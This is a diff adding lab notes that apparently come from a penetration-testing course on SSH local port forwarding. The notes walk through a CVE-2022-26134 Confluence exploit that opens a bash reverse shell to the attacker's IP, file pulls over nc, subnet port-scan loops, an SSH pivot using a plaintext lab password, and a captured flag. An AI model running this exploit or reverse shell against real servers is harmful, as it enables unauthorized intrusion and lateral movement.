@@ -235,6 +235,125 @@ database_admin@pgdatabase01:~$ cat /tmp/socat_flag
 
 # SSH Tunneling
 
+## Local SSH Port Forwarding
+
+2. Start VM Group 2. A server is running on HRSHARES port 4242. Download the **ssh_local_client** binary from **hxxp://CONFLUENCE01:8090/exercises/ssh_local_client**. Create an SSH local port forward on CONFLUENCE01, which will let you run the **ssh_local_client** from your Kali machine against the server on HRSHARES and retrieve the flag.
+
+Note: the source files used to build the **ssh_local_client** binary can be downloaded from **/exercises/client_source.zip**.
 
 
+- Start by exploiting Confluence Server with CVE-2022-26134 exploit and upgrade TTY
+```bash
+# Tab 1 - nc listener
+nc -nlvp 1270
 
+# Tab 2 - exploit
+curl -v http://192.168.233.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.154/1270%200%3E%261%27%29.start%28%29%22%29%7D/
+
+# Tab 1 - CONFLUENCE01 revshell
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+- Find location of **ssh_local_client** and download to Kali
+	- Attempted `scp` first, but it didn't work
+```bash
+# On Kali
+nc -nlvp 4444 > ssh_local_client
+
+# On CONFLUENCE01
+find / -name ssh_local_client 2>/dev/null
+	/opt/atlassian/confluence/confluence/exercises/ssh_local_client
+
+cd /opt/atlassian/confluence/confluence/exercises/
+
+# -q 1 option tells nc to quit after the data is sent
+nc -q 1 192.168.45.154 4444 < ssh_local_client
+```
+	- Do again for client_source.zip
+
+- Enumerate
+```bash
+# Look for network connections
+ip addr
+	...
+	4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+	    link/ether 00:50:56:bf:21:be brd ff:ff:ff:ff:ff:ff
+	    inet 192.168.233.63/24 brd 192.168.233.255 scope global ens192
+	       valid_lft forever preferred_lft forever
+	5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+	    link/ether 00:50:56:bf:d5:0d brd ff:ff:ff:ff:ff:ff
+	    inet 10.4.233.63/24 brd 10.4.233.255 scope global ens224     #<-- NOTE
+	       valid_lft forever preferred_lft forever
+
+# Enum for endpoints and open ports on 10.4.233.x subnet
+	# Careful.... this takes FOREVER
+for i in $(seq 1 254); do nc -zv -w 1 10.4.233.$i 1-1024 2>&1 | grep succeeded; done
+	Connection to 10.4.233.215 22 port [tcp/ssh] succeeded!
+	# Honestly, best to scan IPs for specific ports (like 22, 445, etc) seperately as the grep cmd leaves you asking if the full cmd is working at all
+		# Ex: for i in $(seq 1 254); do nc -zv -w 1 10.4.233.$i 22 2>&1 | grep succeeded; done
+```
+
+- SSH into PGDATABASE01 using creds discovered (assuming previously from a dump)
+```bash
+# In CONFLUENCE01
+ssh database_admin@10.4.233.215
+```
+
+- Enumerate
+```bash
+# In PGDATABASE01 - Look for network connections
+ip addr
+	...
+	4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+	    link/ether 00:50:56:bf:90:91 brd ff:ff:ff:ff:ff:ff
+	    inet 10.4.233.215/24 brd 10.4.233.255 scope global ens192
+	       valid_lft forever preferred_lft forever
+	5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+	    link/ether 00:50:56:bf:0b:b8 brd ff:ff:ff:ff:ff:ff
+	    inet 172.16.233.254/24 brd 172.16.233.255 scope global ens224
+	       valid_lft forever preferred_lft forever
+
+# Enum for endpoints and open ports on 172.16.233.x subnet
+	# Again, going to target specific ports
+for i in $(seq 1 254); do nc -zv -w 1 172.16.233.$i 445 2>&1 | grep succeeded; done
+	Connection to 172.16.233.217 445 port [tcp/microsoft-ds] succeeded!
+```
+
+- Setup SSH Port Forward from w/in Confluence
+```bash
+# Kill existing SSH connection to PGDATABASE01
+database_admin@pgdatabase01:~$ ps aux | grep ssh                                                                                                        
+	root         880  0.0  0.3  12172  7272 ?        Ss   16:22   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups    
+	root        8077  0.0  0.4  13920  8964 ?        Ss   18:11   0:00 sshd: database_admin [priv]
+	databas+    8239  0.0  0.2  14052  5992 ?        S    18:11   0:00 sshd: database_admin@pts/0
+	root       10210  0.0  0.4  13916  9056 ?        Ss   18:37   0:00 sshd: database_admin [priv]
+	databas+   10305  0.0  0.2  14052  5276 ?        S    18:37   0:00 sshd: database_admin@pts/1
+	databas+   10322  0.0  0.0   6300   724 pts/1    S+   18:37   0:00 grep --color=auto ssh
+	
+database_admin@pgdatabase01:~$ kill -9 10305
+	Connection to 10.4.233.215 closed by remote host.
+	Connection to 10.4.233.215 closed.
+
+
+# Setup Local Port Forwarder
+ssh -N -L 0.0.0.0:4242:172.16.233.217:4242 database_admin@10.4.233.215
+	Could not create directory '/home/confluence/.ssh'.
+	The authenticity of host '10.4.233.215 (10.4.233.215)' can't be established.
+	ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
+	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+	yes
+	Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+	database_admin@10.4.233.215's password: sqlpass123
+
+```
+
+- In new Kali tab, get flag
+```bash
+# Read through client_source.zip files.  Notice they're in Ruby
+# Attempt ssh through executing ssh_local_client
+chmod +x ssh_local_client
+
+./ssh_local_client -i 192.168.233.63 -p 4242
+	Connecting to 192.168.233.63:4242
+	Flag: "OS{0ccdf0d584981c5fd0061c873fc7be2d}"
+```
